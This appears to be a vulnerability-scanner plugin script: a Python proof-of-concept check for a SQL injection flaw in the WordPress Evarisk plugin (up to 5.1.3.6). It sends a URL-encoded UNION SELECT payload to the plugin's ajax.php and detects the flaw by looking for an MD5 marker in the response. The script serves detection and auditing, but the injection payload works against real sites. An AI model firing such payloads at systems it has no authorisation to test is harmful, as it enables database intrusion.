#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
POC Name  :  WordPress Evarisk plugin <= 5.1.3.6 SQL Injection Vulnerability
From : http://www.exploit-db.com/exploits/17738/
"""
def assign(service, arg):
    if service == "wordpress":
        return True, arg

def audit(arg):
    payload = ('/wp-content/plugins/evarisk/include/ajax.php?post=true&act=reloadCombo&table=wp_eva__veille_groupe_question&nomRacine=-1%22%20UNION%20ALL%20SELECT%201,MD5(3.14),3,4,5,6,7--%20')
    target_url=arg + payload
    code, head, res, _, _ = curl.curl("%s" % target_url)
    if code == 200 and '4beed3b9c4a886067de0e3a094246f78' in res:
        security_hole(target_url)

if __name__ == '__main__':
    import sys
    from dummy import *
    audit(assign('wordpress', 'http://www.example.com/')[1])